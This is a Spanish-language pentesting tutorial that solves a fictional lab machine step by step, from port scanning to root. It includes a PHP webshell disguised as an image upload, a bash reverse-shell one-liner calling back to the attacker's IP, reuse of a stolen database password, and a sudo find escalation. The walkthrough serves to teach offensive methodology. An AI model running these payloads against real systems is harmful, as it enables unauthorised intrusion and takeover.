# Ejemplo: Resolver una Máquina Paso a Paso

Esta es una **máquina de ejemplo** (ficticia pero realista) resuelta de principio a fin, para que veas **cómo se encadenan** las notas del cuaderno en un caso real. No memorices los comandos concretos: fíjate en el **razonamiento** y en cómo cada hallazgo abre el siguiente paso, aplicando la [Metodología de Pentesting](./Metodolog%C3%ADa%20de%20Pentesting.md).

> **Nota:** las IPs, versiones y flags son inventadas. En una máquina real cambiarán, pero el **método** es siempre el mismo. La víctima es `10.10.10.50`; tu IP de atacante, `10.10.14.7`.

```flow
Reconocimiento :: Escaneo de puertos y versiones.
Enumeración :: Agotar cada servicio (FTP y web).
Acceso inicial :: Webshell subida vía una subida de archivos.
Estabilizar :: Reverse shell + TTY.
Escalada :: sudo mal configurado -> root.
```

---

## 1. Reconocimiento

```bash
nmap -p- --open -sS --min-rate 2000 -n -Pn 10.10.10.50 -oG allPorts
```

Puertos abiertos: `21 (ftp)`, `22 (ssh)`, `80 (http)`. Escaneo dirigido:

```bash
nmap -sCV -p21,22,80 10.10.10.50 -oN targeted
```

Resultado resumido:

```text
21/tcp  vsftpd 3.0.3   (login anónimo permitido)
22/tcp  OpenSSH 8.2
80/tcp  Apache httpd 2.4.41
```

**Mapa mental:** FTP anónimo (revisar), SSH (salida, para cuando tenga credenciales), web (el vector principal). → notas [FTP](../Enumeraci%C3%B3n%20y%20Explotaci%C3%B3n%20de%20Protocolos/Protocolo%20FTP.md), [Escaneo de Puertos](../Reconocimiento/Escaneo%20de%20Puertos.md).

---

## 2. Enumeración

### FTP anónimo

```bash
ftp 10.10.10.50        # usuario: anonymous
```

Hay un archivo `nota.txt`:

```text
Recordatorio: migrar el panel de subida /upload.php antes de producción. — jdoe
```

→ Tenemos un **usuario probable** (`jdoe`) y una **ruta interesante** (`/upload.php`).

### Web (puerto 80)

```bash
whatweb http://10.10.10.50
feroxbuster -u http://10.10.10.50/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php
```

Encontramos `/upload.php`: un formulario de subida de imágenes. → nota [Subida de Archivos](../Vulnerabilidades/Web/Subida%20de%20Archivos.md).

> **Consejo:** fíjate cómo el FTP (algo "aparte") nos dio la pista de la web. Enumerar **todo** y cruzar la información es lo que desatasca las máquinas.

---

## 3. Acceso inicial (foothold)

El formulario solo acepta imágenes y valida el `Content-Type`. Lo saltamos con Burp: subimos un `shell.php` cambiando el `Content-Type` a `image/png` y añadiendo la cabecera mágica:

```text
GIF89a;
<?php system($_GET['cmd']); ?>
```

Localizamos la subida en `/uploads/` y probamos ejecución:

```bash
curl "http://10.10.10.50/uploads/shell.php?cmd=id"
# uid=33(www-data) gid=33(www-data)
```

¡Ejecución de comandos! → nota [Command Injection](../Vulnerabilidades/Web/Command%20Injection.md) / [Shells y TTY](../T%C3%A9cnicas%20de%20Hacking%20Fundamentales/Shells%20y%20TTY.md).

---

## 4. Estabilizar la shell

A la escucha en tu máquina:

```bash
nc -lvnp 443
```

Disparamos la reverse shell por la webshell (URL-encoded):

```bash
curl "http://10.10.10.50/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.7/443+0>%261'"
```

Y estabilizamos la TTY:

```bash
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## 5. Enumeración interna + user flag

Somos `www-data`. Buscamos credenciales y encontramos la contraseña de la BD en `config.php`:

```bash
cat /var/www/html/config.php
# $db_pass = 'S3cr3tDBpass!';
```

La **reutilizamos** para el usuario del FTP/sistema `jdoe`:

```bash
su jdoe        # contraseña: S3cr3tDBpass!
cat /home/jdoe/user.txt
# flag{ejemplo_user_flag}
```

> **Consejo:** la **reutilización de credenciales** (una contraseña de la web que sirve para un usuario del sistema) es el patrón más común para pasar de `www-data` a un usuario real. Siempre prueba las contraseñas que encuentres con `su` y por SSH.

---

## 6. Escalada de privilegios a root

Como `jdoe`, lo primero:

```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/find
```

`find` en [GTFOBins](https://gtfobins.github.io/) permite ejecutar comandos como root:

```bash
sudo find . -exec /bin/sh \; -quit
# id -> uid=0(root)
cat /root/root.txt
# flag{ejemplo_root_flag}
```

¡Máquina comprometida! → nota [Escalada de Privilegios/Linux](../Escalada%20de%20Privilegios/Linux.md).

---

## Lo que deberías llevarte de este ejemplo

- **Cada paso nació del anterior:** FTP → pista del usuario y de `/upload.php` → subida → webshell → config con credenciales → reutilización → `sudo -l` → root.
- **Nunca saltamos pasos:** agotamos la enumeración antes de atacar, y estabilizamos la shell antes de escalar.
- **Las credenciales se reutilizan** constantemente. La BD nos dio la contraseña del usuario.
- **`sudo -l` + GTFOBins** resuelve una enorme parte de las escaladas.

---

> **Consejo:** cuando te atasques en una máquina real, vuelve a la [chuleta "¿Y ahora qué?"](./Metodolog%C3%ADa%20de%20Pentesting.md) y pregúntate en qué fase estás y qué te queda por enumerar en ella. El 90 % de los "no sé cómo seguir" se resuelven enumerando algo que ya tenías delante.
